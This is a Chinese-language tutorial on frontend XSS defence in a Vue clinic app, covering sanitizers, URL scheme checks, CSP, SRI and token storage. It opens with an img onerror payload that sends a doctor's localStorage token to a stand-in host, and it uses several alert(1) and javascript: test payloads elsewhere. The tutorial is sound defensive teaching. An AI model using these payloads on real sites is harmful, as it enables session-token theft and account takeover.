## 從一個具體問題開始：一則備註讀走了每位醫師的 token

門診系統的病歷頁有「醫囑備註」欄。為了保留換行與粗體，前端用 `v-html` 顯示：

```vue
<div class="note" v-html="record.note"></div>
```

某天櫃台從外部轉診系統複製一段文字貼進備註，裡面夾著這一行：

```html
<img src="x" onerror="fetch('https://collect.example/?t=' + localStorage.getItem('token'))">
```

之後每位打開這份病歷的醫師，瀏覽器都會去載入一張不存在的圖片、觸發 `onerror`，把 localStorage 裡的 token 送到外部網址。拿到 token 的人在它過期前，可以用醫師的身分呼叫任何 API。畫面上看不出異狀，只有 Network 分頁多了一筆送往 `collect.example` 的請求。

同一個系統還有兩個同類的洞：

- 醫師個人頁的「個人網站」寫成 `<a :href="doctor.website">`。有人把網址填成 `javascript:fetch(…)`，其他人點下去就執行。
- 首頁從 CDN 載入一支客服 script，網址固定、內容由廠商隨時更新。CDN 被入侵的那幾個小時，這支 script 在每個頁面裡都讀得到畫面上的病歷。

三件事的共同點：別人的程式在你的頁面裡執行，權限和你的程式一樣。伺服器那一側的輸出編碼、安全標頭與 CSRF 防護見後端的 [XSS、CSRF 與安全標頭](#/skill/xss-csrf)，這一課講前端程式自己決定的部分。

## 運作原理

### 哪些寫法會把字串當成程式

瀏覽器把一個字串放進頁面，有三種處理方式：當文字、當 HTML、當網址或程式碼。

| 寫法 | 字串被當成 | 放進使用者內容 |
|---|---|---|
| `{{ x }}`、`v-text`、`textContent` | 文字，標籤原樣顯示成字 | 安全 |
| `:title="x"`、`setAttribute('title', x)` | 屬性值，引號會被處理 | 安全（網址類屬性例外） |
| `v-html`、`innerHTML`、`outerHTML`、`insertAdjacentHTML` | HTML，建出元素與屬性 | 事件屬性會執行 |
| `:href`、`:src`、`location.href = x`、`window.open(x)` | 網址 | `javascript:` 網址會執行 |
| `eval(x)`、`new Function(x)`、`setTimeout(x)`（x 是字串） | JavaScript | 直接執行 |

在 Chromium 153 實測：`el.innerHTML = '<script>…</script>'` 插進去的 script 不會執行（HTML 規範規定這樣插入的 script 不執行），但 `el.innerHTML = '<img src="x" onerror="…">'` 的 `onerror` 會。只過濾 `<script>` 的程式擋不住後者，`<svg onload>`、`<iframe srcdoc>` 也是同一類。

### Vue 處理了什麼、沒處理什麼

用 Vue 3.5.45 實測同一段字串 `<img src=x onerror="…">`：

- `{{ note }}`：Elements 分頁看到的是 `&lt;img src=x …&gt;`，畫面顯示這串字，沒有執行。
- `v-html="note"`：建出一個 `<img>`，`onerror` 執行了。
- `:href="url"`，`url` 是 `javascript:window.x=1`：`href` 原樣輸出，點下去執行。Vue 官方文件的 Security 一節也寫明 Vue 不替網址做檢查。

另外兩件和 Vue 有關的事：

- 使用者的內容不能變成模板。含編譯器的完整版 Vue 可以在瀏覽器裡編譯 `template` 字串，字串裡的 `{{ }}` 會被當成 JavaScript 運算式執行。Vite 建置的專案在建置時就把 SFC 的模板編譯成函式，執行時用的是不含編譯器的 runtime 版。
- `v-html` 插進來的元素沒有 `data-v-…` 屬性，`<style scoped>` 的規則套不到它們（見 [CSS 怎麼決定套用哪一條](#/skill/css-cascade)），常有人因為這個改用全域樣式。

### 一定要顯示 HTML 時：sanitizer

衛教文章、公告這類由後台編輯器產生的 HTML，需要保留標題、清單與連結。這時用 HTML sanitizer：把字串解析成 DOM，依允許清單保留標籤與屬性，其他移除。DOMPurify 3.4.18 在 Chromium 的預設結果：

| 輸入 | `DOMPurify.sanitize()` 的結果 |
|---|---|
| `<b>過敏</b><img src=x onerror=alert(1)>` | `<b>過敏</b><img src="x">` |
| `<a href="javascript:alert(1)">x</a>` | `<a>x</a>` |
| `<script>alert(1)</script><p onclick="x()">p</p>` | `<p>p</p>` |
| `<p>x</p><iframe src="…"></iframe>` | `<p>x</p>` |

預設會保留 `style` 屬性與 `<form>`、`<input>`，也會拿掉 `target`。文章不需要的東西用 `ALLOWED_TAGS`、`ALLOWED_ATTR` 收窄，只留用得到的。不要自己用正規表示式過濾：上面的 `<img onerror>` 不含 `<script>`，HTML 的解析規則還有很多寫法能繞過字串比對。

瀏覽器內建的 Sanitizer API（`element.setHTML()`）在 2026 年 11 月只有 Chrome 146 與 Firefox 148 以上支援，Safari 還沒有，不是 Baseline，目前仍用函式庫。想在支援的瀏覽器先用內建的，就做功能偵測：`'setHTML' in Element.prototype` 成立時呼叫 `el.setHTML(html, { sanitizer: { elements: [...] } })`，不成立時才用 `import('dompurify')` 動態載入函式庫，支援的瀏覽器不必下載它。兩者的行為不同：內建的給了 `elements` 之後，清單以外的元素連同內容一起移除，也會拿掉 `aria-*` 與 `data-*`；DOMPurify 預設保留這些屬性與被移除元素的文字，要對齊得加 `KEEP_CONTENT: false`、`ALLOW_ARIA_ATTR: false`、`ALLOW_DATA_ATTR: false`。

過濾放在哪一邊：後端存檔時過濾，保護所有讀這份資料的地方（App、Email、匯出）；前端在 `v-html` 之前再過濾一次，因為放進頁面的是前端。兩者不衝突。

### 網址：檢查 scheme

HTML 跳脫處理不了網址：`javascript:alert(1)` 沒有 `<`、`>` 或引號，跳脫之後原樣不變。要檢查的是 scheme。用字串比對 `startsWith('javascript:')` 會漏掉 `  JavaScript:…` 這種前面有空白、大小寫混用的寫法；`new URL()` 會先把空白去掉、scheme 轉成小寫，`new URL('  JavaScript:alert(1)').protocol` 得到 `'javascript:'`，用它比對允許清單。

兩個相關的設定：

- `target="_blank"`：Chrome 88、Firefox 79、Safari 12.1 起，`target="_blank"` 的連結預設就是 `noopener`，新分頁的 `window.opener` 是 `null`，不能把原頁面導去別處。連 Referer 都不想送時加 `rel="noreferrer"`。
- 登入後的 `redirect` 參數也是網址，而且是站內轉址：只接受 `/` 開頭、不是 `//` 開頭的路徑，見 [登入狀態與 401](#/skill/auth-frontend)。

### token 放在哪裡都擋不住 XSS

| 位置 | XSS 時注入的 script 能做什麼 | 其他代價 |
|---|---|---|
| localStorage | 讀走 token，在別的電腦上用到它過期 | 關掉瀏覽器還在 |
| sessionStorage | 讀走 token（只限這個分頁的那一份） | 關掉分頁就消失 |
| 記憶體（Pinia store） | 頁面開著時用它發請求；要讀走得剛好在它存在時執行 | 重新整理就沒了，要搭配 refresh 機制 |
| `HttpOnly` cookie | 讀不到 cookie，但能在頁面裡發請求，瀏覽器自動帶上 | 要處理 CSRF 與跨網域的 `credentials` |

每個位置都會被利用，差別在攻擊者拿走的是「token 本身」還是「頁面開著時的操作權」。登入方案的整體取捨見 [登入狀態與 401](#/skill/auth-frontend) 與後端的 [驗證基礎](#/skill/authn-basics)；從資安的角度，最有效的仍是不讓 XSS 發生。

:::stop 讀到這裡可以先停：會找出把字串當成 HTML 或網址的寫法，用 sanitizer 與 scheme 允許清單處理。後面的 CSP、第三方 script 與前端秘密，在要設定安全標頭或接廠商的 script 時再回來讀。

### CSP：伺服器限制前端程式能做什麼

CSP（Content-Security-Policy）是伺服器隨 HTML 送出的回應標頭，告訴瀏覽器這個頁面能執行哪些來源的 script、套用哪些樣式、連到哪些網址。注入的程式就算進了 DOM，違反 CSP 也不會執行。代價是自己的程式也要照它的規矩寫。

`script-src 'self'` 之下，下列寫法都會被擋。訊息取自 Chromium 153 的 Console：

| 被擋的寫法 | Console 訊息的開頭 | 改法 |
|---|---|---|
| `<script>…</script>` 寫在 HTML 裡 | `Executing inline script violates the following Content Security Policy directive 'script-src 'self''` | 搬到 `.js` 檔，或由伺服器每次產生 nonce |
| `<button onclick="…">` | `Executing inline event handler violates …` | 用 `@click` 或 `addEventListener` |
| `<a href="javascript:…">` | `Running the JavaScript URL violates …` | 改成按鈕與事件處理函式 |
| `eval`、`new Function`、字串版的 `setTimeout` | `EvalError: Evaluating a string as JavaScript violates … because 'unsafe-eval' is not an allowed source of script` | 不從字串執行程式 |

和 Vue、Vite 有關的部分，在 Chromium 153 實測：

- Vite 8 建置出的 `index.html` 只有 `<script type="module" crossorigin src="/assets/index-….js">` 與一個 `<link rel="stylesheet">`，沒有 inline script。一個 Vue 3.5 的 SFC 專案在 `default-src 'self'; script-src 'self'; style-src 'self'` 之下完整運作，Console 沒有任何違規。
- `style-src 'self'` 擋的是 HTML 裡的 `style="…"` 屬性、`<style>` 標籤，以及 `setAttribute('style', …)`。Vue 的 `:style` 與 SFC 裡 CSS 的 `v-bind()` 用 CSSOM（`el.style.setProperty`）設定，不會被擋。
- 開發時 Vite 用 `<style>` 標籤注入 CSS 以支援 HMR，嚴格的 `style-src` 會擋掉它。Vite 的 `html.cspNonce` 設定一個佔位字串後，建置與開發的 HTML 會加上 `<meta property="csp-nonce" nonce="…">` 與每個標籤的 `nonce` 屬性；伺服器要在每次回應時把佔位字串換成新的隨機值。
- 載入含編譯器的 `vue.global.js`，在 HTML 裡寫模板：畫面空白，Console 出現 `[Vue warn]: Template compilation error: Error parsing JavaScript expression: Evaluating a string as JavaScript violates …`。編譯器需要 `'unsafe-eval'`，加了它 CSP 就少了一大半作用。
- Vite 把小於 `build.assetsInlineLimit`（預設 4096 bytes）的圖片與字型轉成 `data:` 網址寫進 CSS 或 JS。`img-src 'self'` 會擋下它們：`Loading the image 'data:image/png;base64,…' violates the following Content Security Policy directive: "img-src 'self'"`。在 `img-src`、`font-src` 加 `data:`，或把上限設成 0。
- API 在另一個網域時要列進 `connect-src`。漏了的話，Console 是 `Connecting to 'https://api.example.com/…' violates the following Content Security Policy directive: "default-src 'self'". Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.`，程式拿到的是 `TypeError: Failed to fetch`，和 CORS 錯誤一樣，要看 Console 才分得出來（見 [從前端看同源與 CORS](#/skill/same-origin-frontend)）。

導入 CSP 時先送 `Content-Security-Policy-Report-Only`：瀏覽器照樣回報違規、但不阻擋，觀察一段時間確定沒有誤擋，再換成正式的標頭。主機不能設定回應標頭時（例如某些靜態網站服務），可以在 `index.html` 寫 `<meta http-equiv="Content-Security-Policy" content="…">`，但 `frame-ancestors` 與回報功能在 meta 裡無效。

更進一步的是 Trusted Types：CSP 加上 `require-trusted-types-for 'script'` 之後，`innerHTML` 這類地方只接受經過自訂 policy 產生的物件，直接給字串會丟出錯誤。Chrome 83、Safari 26、Firefox 148 支援，2026 年 2 月成為 Baseline，舊瀏覽器還沒有，先當成額外的一層：程式照樣透過 policy 寫入，不支援的瀏覽器只是不強制檢查。過濾仍要自己做，不支援的瀏覽器不會替你擋。

### 第三方 script

`<script src="https://cdn.example/widget.js">` 載入的程式和你的程式在同一個頁面、同一個來源下執行：讀得到 DOM、表單裡正在輸入的內容、localStorage，也能用使用者的 cookie 發請求。廠商的程式、廠商的 CDN、廠商的帳號，任何一個被入侵都等於你的頁面被入侵。

- **固定版本加 SRI**：`integrity="sha384-…"` 記錄檔案的雜湊，下載回來的內容不符，瀏覽器拒絕執行。跨來源的檔案要同時加 `crossorigin="anonymous"`。廠商只提供「永遠是最新版」的網址時無法加 SRI，這也表示廠商可以隨時換掉你頁面上執行的程式。
- **只在需要的頁面載入**：登入、付款、病歷這類頁面不放分析、客服、廣告 script。tag manager 讓行銷人員不經部署就能加 script，它的權限要當成程式部署來管。
- **能隔離就隔離**：外部的表單或小工具用 `<iframe sandbox="allow-scripts allow-forms">` 嵌入，它在另一個來源執行，讀不到你的頁面。雙方用 `postMessage` 溝通時，收訊的一方一定先檢查 `event.origin`。
- npm 套件也是第三方程式，而且會被打包進你的 bundle，見 [套件管理與供應鏈](#/skill/npm-packages)。

### 前端沒有秘密

前端程式會整份下載到使用者的瀏覽器。`VITE_` 開頭的變數在建置時寫死進 bundle，`.env` 裡的地圖金鑰、寫在程式裡的 API key、註解掉的測試帳號，在 `dist/assets/*.js` 都搜得到。需要金鑰的服務由後端代為呼叫，細節見 [建置時設定與執行時設定](#/skill/env-config) 與後端的 [秘密管理](#/skill/secrets)。

## 實際程式

### 純文字與經過過濾的 HTML

```vue
<!-- MedicalNote.vue：醫囑備註，純文字 -->
<script setup>
defineProps({ note: { type: String, default: '' } })
</script>

<template>
  <p class="note">{{ note }}</p>
</template>

<style scoped>
.note { white-space: pre-line; }   /* 保留換行，不必用 v-html 插 <br> */
</style>
```

```vue
<!-- HealthArticle.vue：後台編輯的衛教文章 -->
<script setup>
import { computed } from 'vue'
import DOMPurify from 'dompurify'

const props = defineProps({ html: { type: String, required: true } })

// 允許清單：只留文章用得到的標籤與屬性，其他全部移除
const clean = computed(() =>
  DOMPurify.sanitize(props.html, {
    ALLOWED_TAGS: ['h2', 'h3', 'p', 'ul', 'ol', 'li', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href'],
  }),
)
</script>

<template>
  <!-- 專案裡唯一的 v-html，內容一定先經過 sanitize -->
  <article class="article" v-html="clean"></article>
</template>
```

在 Chromium 實測這組設定：`<a href="javascript:alert(1)" title="x">` 變成 `<a>`，`<a href="https://clinic.example/x" onclick="y()">` 只留下 `href`，`<img onerror>` 整個移除。

### 網址檢查

```js run
// 使用者或 API 給的網址：只放行允許的 scheme，其他不當成連結
const ALLOWED = ['https:', 'mailto:', 'tel:']

function safeHref(raw, base = 'https://clinic.example') {
  try {
    const url = new URL(String(raw), base)   // 相對路徑以本站為基準；前後空白會被去掉
    return ALLOWED.includes(url.protocol) ? url.href : null
  } catch {
    return null                               // 解析不了的字串
  }
}

// HTML 跳脫：處理文字內容裡的 < > & " '
function escapeHtml(s) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }
  return String(s).replace(/[&<>"']/g, (c) => map[c])
}

const inputs = [
  'https://dr-lin.example/profile',
  '/doctors/12',
  'mailto:service@clinic.example',
  'javascript:alert(1)',
  '  JavaScript:alert(1)',                      // 前面有空白、大小寫混用
  'data:text/html,<script>alert(1)</script>',
  'http://dr-lin.example',                      // 沒有 TLS，這裡不放行
]
for (const raw of inputs) {
  console.log(JSON.stringify(raw).padEnd(46), '→', safeHref(raw))
}

// 跳脫對 javascript: 網址沒有作用：裡面沒有要跳脫的字元
console.log(escapeHtml('javascript:alert(1)'))
console.log(escapeHtml('<img src=x onerror=alert(1)>'))
```

在 Vue 裡用 computed 包起來，`null` 時顯示純文字：

```vue
<a v-if="websiteHref" :href="websiteHref" target="_blank" rel="noreferrer">個人網站</a>
<span v-else>{{ doctor.website }}</span>
```

### CSP 標頭

```nginx
# 前端靜態檔的 server 區塊；其他安全標頭與 add_header 的繼承規則見後端的 XSS 課
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'" always;
```

先觀察時把標頭名稱換成 `Content-Security-Policy-Report-Only`，其他不變。

### 第三方 script 與 postMessage

```html
<!-- 固定版本 + SRI；只放在需要客服的頁面 -->
<script
  src="https://cdn.example/chat-widget@2.4.1/widget.min.js"
  integrity="sha384-（下載同一個檔案自己算）"
  crossorigin="anonymous"
  defer></script>
```

```bash
# 自己算 SRI 雜湊：輸出 base64 的 SHA-384，前面加上 sha384-
curl -s https://cdn.example/chat-widget@2.4.1/widget.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

```js
// 付款頁用 iframe 嵌入金流的表單，金流完成後用 postMessage 通知
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://pay.example') return            // 只接受金流的來源
  const data = event.data
  if (data?.type !== 'payment-done' || typeof data.appointmentId !== 'string') return
  router.push({ name: 'appointment-paid', params: { id: data.appointmentId } })
})
```

## 常見錯誤與錯誤訊息

| 現象或訊息 | 原因 | 修法 |
|---|---|---|
| 輸入 `<img src=x onerror=alert(1)>` 後跳出對話框 | `v-html` 或 `innerHTML` 放了使用者內容 | 改成 `{{ }}`；要顯示 HTML 先經過 sanitizer |
| 過濾了 `<script>` 還是被注入 | 事件屬性（`onerror`、`onload`）不需要 `<script>` | 用 DOMPurify 這類允許清單過濾 |
| 點連結執行了程式 | `:href` 綁了 `javascript:` 網址，Vue 不檢查 scheme | `new URL()` 讀 `protocol`，只放行允許清單 |
| `Executing inline script violates …` | `index.html` 或程式插入了 inline `<script>` | 搬到外部檔，或伺服器每次產生 nonce |
| `Executing inline event handler violates …` | HTML 裡有 `onclick="…"` 這類屬性 | 改用 `@click` 或 `addEventListener` |
| `EvalError: Evaluating a string as JavaScript violates …` | `eval`、`new Function`、含編譯器的 Vue 完整版 | 不從字串執行程式；Vue 用 SFC 在建置時編譯 |
| `Applying inline style violates the following Content Security Policy directive 'style-src 'self''` | HTML 的 `style="…"`、`<style>`，或 Vite 開發伺服器注入的樣式 | 樣式放 CSS 檔；開發時用 `html.cspNonce` |
| 小圖示或字型在正式環境不見，訊息是 `Loading the image 'data:…' violates …` | Vite 把小檔案轉成 `data:` 網址 | `img-src`、`font-src` 加 `data:`，或把 `build.assetsInlineLimit` 設成 0 |
| `Connecting to '…' violates …`，程式拿到 `TypeError: Failed to fetch` | `connect-src` 沒有列 API 的網域 | 加進 `connect-src`；用 Console 訊息和 CORS 錯誤區分 |
| `Failed to find a valid digest in the 'integrity' attribute …` | CDN 上的檔案和 `integrity` 記錄的不同 | 確認版本；廠商換了檔案就重新審查再更新雜湊 |
| bundle 搜得到金鑰 | 金鑰放在 `VITE_` 變數或程式裡 | 移到後端；已經外流的金鑰作廢重發 |

AI 產生的前端常見的三個：為了顯示換行或粗體直接用 `v-html`；把 API 給的網址直接綁 `:href`；為了讓 CSP 不報錯，在 `script-src` 加上 `'unsafe-inline'` 與 `'unsafe-eval'`。最後一個等於把 CSP 拿掉，要改的是程式的寫法。

## 動手

1. 在「網址檢查」那段按「在 Playground 開啟」，在 `inputs` 加上 `'//evil.example/x'`：它會被放行，因為 scheme 是 `https:`。外部連結可以接受，但登入後的 `redirect` 不行，試著加一個只接受站內路徑的 `safeRedirect`。
2. 打開後端的 [XSS 與 CSRF 實驗室](#/lab/XssCsrfLab)，切換輸出位置，看 HTML 跳脫、CSP、`HttpOnly` 各自擋下哪一種情況。
3. 在自己的專案搜尋 `v-html`、`innerHTML`、`insertAdjacentHTML`、`:href`，列出每一處的資料來源；來源是使用者或 API 的，照上面的寫法改掉。
4. 在 `vite.config.js` 的 `preview.headers` 加上 `Content-Security-Policy-Report-Only`，`npm run build` 後用 `vite preview` 把每個頁面點過一遍，整理 Console 與 Issues 分頁列出的違規。Report-Only 不能寫在 meta 裡，要用回應標頭。
